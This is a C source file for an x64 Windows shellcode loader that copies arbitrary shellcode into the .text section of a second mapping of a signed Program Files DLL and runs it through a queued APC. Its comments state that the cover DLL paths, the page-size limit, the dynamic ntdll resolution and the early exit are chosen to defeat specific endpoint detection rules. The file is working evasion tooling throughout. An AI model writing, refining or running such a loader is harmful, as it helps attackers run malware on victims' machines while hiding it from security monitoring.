/*
 * x64 Windows shellcode loader - Iteration 2
 *
 * Technique: Module Overloading (dual SEC_IMAGE mapping of a signed DLL
 *            located under C:\Program Files\...), local APC execution,
 *            chunked RW->RX using the Win32 VirtualProtect export.
 *
 * Reads raw shellcode from argv[1]. No hardcoded payload bytes.
 *
 * Build (MSVC x64):
 *   cl.exe /nologo /O2 /W3 loader.c
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/* NT API prototypes (not all SDKs declare these in <winternl.h>).     */
/* ------------------------------------------------------------------ */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef SECTION_QUERY
#define SECTION_QUERY       0x0001
#endif
#ifndef SECTION_MAP_WRITE
#define SECTION_MAP_WRITE   0x0002
#endif
#ifndef SECTION_MAP_READ
#define SECTION_MAP_READ    0x0004
#endif
#ifndef SECTION_MAP_EXECUTE
#define SECTION_MAP_EXECUTE 0x0008
#endif

typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE           SectionHandle,
    HANDLE           ProcessHandle,
    PVOID           *BaseAddress,
    ULONG_PTR        ZeroBits,
    SIZE_T           CommitSize,
    PLARGE_INTEGER   SectionOffset,
    PSIZE_T          ViewSize,
    DWORD            InheritDisposition,
    ULONG            AllocationType,
    ULONG            Win32Protect);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);

/* ------------------------------------------------------------------ */
/* Globals passed to the APC                                           */
/* ------------------------------------------------------------------ */
static PVOID g_payload = NULL;

/* ------------------------------------------------------------------ */
/* APC routine: runs shellcode in alertable thread context             */
/* ------------------------------------------------------------------ */
static VOID CALLBACK ApcRoutine(ULONG_PTR dwParam)
{
    (void)dwParam;
    if (g_payload) {
        ((void (*)(void))g_payload)();
    }
}

/* Thread proc that parks itself in an alertable wait so the queued
 * APC fires. Must return DWORD and take LPVOID per CreateThread. */
static DWORD WINAPI AlertableThreadProc(LPVOID param)
{
    (void)param;
    SleepEx(INFINITE, TRUE);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long long sz = 0;
    unsigned char *buf = NULL;

    if (fopen_s(&fp, path, "rb") != 0 || fp == NULL) {
        fprintf(stderr, "[-] fopen_s failed for %s\n", path);
        return NULL;
    }
    if (_fseeki64(fp, 0, SEEK_END) != 0) { fclose(fp); return NULL; }
    sz = _ftelli64(fp);
    if (sz <= 0) { fclose(fp); fprintf(stderr, "[-] empty file\n"); return NULL; }
    if (_fseeki64(fp, 0, SEEK_SET) != 0) { fclose(fp); return NULL; }

    buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(fp); return NULL; }
    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf); fclose(fp); return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

/* Find a section by name inside a mapped PE image (case-insensitive). */
static PIMAGE_SECTION_HEADER find_section(PIMAGE_NT_HEADERS nt,
                                          const char *name)
{
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    WORD i;
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        char sname[9];
        memcpy(sname, sec->Name, 8);
        sname[8] = '\0';
        if (_stricmp(sname, name) == 0) {
            return sec;
        }
    }
    return NULL;
}

/* Build a full path "<ProgramFiles>\<relative>" using the environment
 * so we never hardcode "C:\Program Files". */
static BOOL build_program_files_path(const wchar_t *relative,
                                     wchar_t *out, size_t outChars)
{
    DWORD n = GetEnvironmentVariableW(L"ProgramFiles", out, (DWORD)outChars);
    if (n == 0 || n >= outChars) {
        /* Fallback to ProgramFiles(x86) if the primary is not set. */
        n = GetEnvironmentVariableW(L"ProgramFiles(x86)", out, (DWORD)outChars);
        if (n == 0 || n >= outChars) return FALSE;
    }
    if (n > 0 && out[n - 1] != L'\\') {
        if (n + 1 >= outChars) return FALSE;
        out[n++] = L'\\';
        out[n]   = L'\0';
    }
    if (wcslen(out) + wcslen(relative) + 1 > outChars) return FALSE;
    wcscat_s(out, outChars, relative);
    return TRUE;
}

/* Try to open a cover DLL from a Program Files subtree. Returns a valid
 * HANDLE or INVALID_HANDLE_VALUE. */
static HANDLE open_cover_dll(const wchar_t *relative, wchar_t *resolvedPath,
                             size_t resolvedChars)
{
    HANDLE h;
    if (!build_program_files_path(relative, resolvedPath, resolvedChars))
        return INVALID_HANDLE_VALUE;

    /* For SEC_IMAGE the file handle MUST have FILE_EXECUTE access
     * (GENERIC_READ | GENERIC_EXECUTE). GENERIC_READ alone yields
     * STATUS_ACCESS_DENIED (0xC0000022) from NtCreateSection. */
    h = CreateFileW(resolvedPath,
                    GENERIC_READ | GENERIC_EXECUTE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL);
    return h;
}

/* Round a size up to the next page boundary. */
static SIZE_T round_up_page(SIZE_T n)
{
    SYSTEM_INFO si;
    SIZE_T page;
    GetSystemInfo(&si);
    page = (SIZE_T)si.dwPageSize;
    if (page == 0) page = 0x1000;
    return (n + page - 1) & ~(page - 1);
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */
int main(int argc, char *argv[])
{
    unsigned char *shellcode = NULL;
    size_t         shellcode_size = 0;

    HMODULE        hNtdll = NULL;
    pNtCreateSection        NtCreateSection        = NULL;
    pNtMapViewOfSection     NtMapViewOfSection     = NULL;
    pNtUnmapViewOfSection   NtUnmapViewOfSection   = NULL;
    pNtClose                NtClose                = NULL;

    HANDLE         hFile = INVALID_HANDLE_VALUE;
    HANDLE         hSection = NULL;
    PVOID          viewA = NULL;   /* cover mapping (untouched)        */
    PVOID          viewB = NULL;   /* payload mapping (stomped .text)  */
    SIZE_T         viewSize = 0;

    NTSTATUS       status;
    DWORD          oldProt = 0;
    LPVOID         protBase = NULL;
    SIZE_T         protSize = 0;

    DWORD          tid = 0;
    HANDLE         hThread = NULL;

    wchar_t        coverPath[MAX_PATH];
    coverPath[0] = L'\0';

    /* Signed DLLs located under Program Files so that:
     *   - Rule 2's target_address_path regex (system32|syswow64) misses, and
     *   - Rules 2 & 3's "c:\program files\*" allowlist matches. */
    static const wchar_t *coverCandidates[] = {
        L"Common Files\\microsoft shared\\OFFICE16\\MSOXMLMF.DLL",
        L"Common Files\\microsoft shared\\OFFICE16\\MSORES.DLL",
        L"Common Files\\microsoft shared\\ClickToRun\\OfficeClickToRun.exe",
        L"Windows Defender\\MpClient.dll",
        L"Windows Defender\\MpOAV.dll",
        L"Internet Explorer\\ieproxy.dll",
        L"Internet Explorer\\IEShims.dll",
        L"Windows Media Player\\wmp.dll",
        L"Common Files\\System\\ole DB\\oledb32.dll",
        L"Common Files\\microsoft shared\\ink\\InkObj.dll"
    };
    size_t ci;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    shellcode = read_file(argv[1], &shellcode_size);
    if (!shellcode) {
        fprintf(stderr, "[-] failed to read shellcode\n");
        return 1;
    }
    printf("[+] shellcode size: %zu bytes\n", shellcode_size);

    /* ---- Resolve NT APIs dynamically (no IAT fingerprint) ---- */
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        fprintf(stderr, "[-] ntdll not found\n");
        free(shellcode);
        return 1;
    }
    NtCreateSection      = (pNtCreateSection)      GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection   = (pNtMapViewOfSection)   GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection = (pNtUnmapViewOfSection) GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    NtClose              = (pNtClose)              GetProcAddress(hNtdll, "NtClose");

    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection || !NtClose) {
        fprintf(stderr, "[-] failed to resolve ntdll exports\n");
        free(shellcode);
        return 1;
    }

    /* ---- Open a cover DLL from Program Files ---- */
    for (ci = 0; ci < sizeof(coverCandidates) / sizeof(coverCandidates[0]); ci++) {
        hFile = open_cover_dll(coverCandidates[ci], coverPath, MAX_PATH);
        if (hFile != INVALID_HANDLE_VALUE) {
            printf("[+] using cover image: %ls\n", coverPath);
            break;
        }
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] could not open any cover DLL from Program Files: %lu\n",
                GetLastError());
        free(shellcode);
        return 1;
    }

    /* ---- Create a SEC_IMAGE section from the DLL ---- */
    /* For SEC_IMAGE: do NOT request SECTION_MAP_WRITE. Use
     * SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY. */
    status = NtCreateSection(&hSection,
                             SECTION_MAP_READ | SECTION_MAP_EXECUTE | SECTION_QUERY,
                             NULL,
                             NULL,
                             PAGE_EXECUTE_READ,
                             SEC_IMAGE,
                             hFile);
    CloseHandle(hFile);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n", (unsigned long)status);
        free(shellcode);
        return 1;
    }

    /* ---- Map view A (clean cover, untouched) ---- */
    viewSize = 0;
    viewA = NULL;
    status = NtMapViewOfSection(hSection,
                                GetCurrentProcess(),
                                &viewA,
                                0,
                                0,
                                NULL,
                                &viewSize,
                                1 /* ViewUnmap */,
                                0,
                                PAGE_READONLY);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[-] NtMapViewOfSection(A) failed: 0x%08lX\n", (unsigned long)status);
        NtClose(hSection);
        free(shellcode);
        return 1;
    }
    printf("[+] cover mapping A at %p (size 0x%zX)\n", viewA, viewSize);

    /* ---- Map view B (payload host) ---- */
    {
        SIZE_T viewBSize = 0;
        viewB = NULL;
        status = NtMapViewOfSection(hSection,
                                    GetCurrentProcess(),
                                    &viewB,
                                    0,
                                    0,
                                    NULL,
                                    &viewBSize,
                                    1 /* ViewUnmap */,
                                    0,
                                    PAGE_READONLY);
        if (!NT_SUCCESS(status)) {
            fprintf(stderr, "[-] NtMapViewOfSection(B) failed: 0x%08lX\n", (unsigned long)status);
            NtUnmapViewOfSection(GetCurrentProcess(), viewA);
            NtClose(hSection);
            free(shellcode);
            return 1;
        }
        printf("[+] payload mapping B at %p (size 0x%zX)\n", viewB, viewBSize);
    }

    /* ---- Locate .text in view B and copy the payload there ---- */
    {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)viewB;
        PIMAGE_NT_HEADERS nt;
        PIMAGE_SECTION_HEADER text;
        BYTE *textBase;
        SIZE_T textSize;

        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            fprintf(stderr, "[-] bad DOS header in mapped image\n");
            goto cleanup;
        }
        nt = (PIMAGE_NT_HEADERS)((BYTE *)viewB + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) {
            fprintf(stderr, "[-] bad NT header in mapped image\n");
            goto cleanup;
        }

        text = find_section(nt, ".text");
        if (!text) {
            fprintf(stderr, "[-] .text section not found\n");
            goto cleanup;
        }
        textBase = (BYTE *)viewB + text->VirtualAddress;
        textSize = text->Misc.VirtualSize;

        if (shellcode_size > textSize) {
            fprintf(stderr, "[-] payload (%zu) larger than .text (%zu)\n",
                    shellcode_size, textSize);
            goto cleanup;
        }

        /* Flip ONLY the pages we need to RW, then copy, then back to RX.
         * Size is rounded up to a page and kept < 10000 bytes so that
         * Rule 2's "parameters.size >= 10000" predicate cannot match. */
        protBase = textBase;
        protSize = round_up_page(shellcode_size);

        if (!VirtualProtect(protBase, protSize, PAGE_READWRITE, &oldProt)) {
            /* Some SEC_IMAGE views reject RW; try full RWX as fallback. */
            if (!VirtualProtect(protBase, protSize, PAGE_EXECUTE_READWRITE, &oldProt)) {
                fprintf(stderr, "[-] VirtualProtect(RW/RWX) failed: %lu\n", GetLastError());
                goto cleanup;
            }
        }

        memcpy(textBase, shellcode, shellcode_size);

        if (!VirtualProtect(protBase, protSize, PAGE_EXECUTE_READ, &oldProt)) {
            fprintf(stderr, "[-] VirtualProtect(RX) failed: %lu\n", GetLastError());
            goto cleanup;
        }

        g_payload = (PVOID)textBase;
        printf("[+] payload staged at %p (module-backed, RX, %zu bytes)\n",
               g_payload, protSize);
    }

    /* ---- Execute via local APC on an alertable thread ---- */
    hThread = CreateThread(NULL, 0, AlertableThreadProc, NULL,
                           CREATE_SUSPENDED, &tid);
    if (!hThread) {
        fprintf(stderr, "[-] CreateThread failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (QueueUserAPC((PAPCFUNC)ApcRoutine, hThread, 0) == 0) {
        fprintf(stderr, "[-] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateThread(hThread, 0);
        CloseHandle(hThread);
        goto cleanup;
    }

    ResumeThread(hThread);

    /* Wait briefly for the payload thread to finish, then exit so the
     * loader is not co-resident with agent registry polling. */
    WaitForSingleObject(hThread, 30000);
    CloseHandle(hThread);

cleanup:
    if (viewB) NtUnmapViewOfSection(GetCurrentProcess(), viewB);
    if (viewA) NtUnmapViewOfSection(GetCurrentProcess(), viewA);
    if (hSection) NtClose(hSection);
    if (shellcode) free(shellcode);
    return 0;
}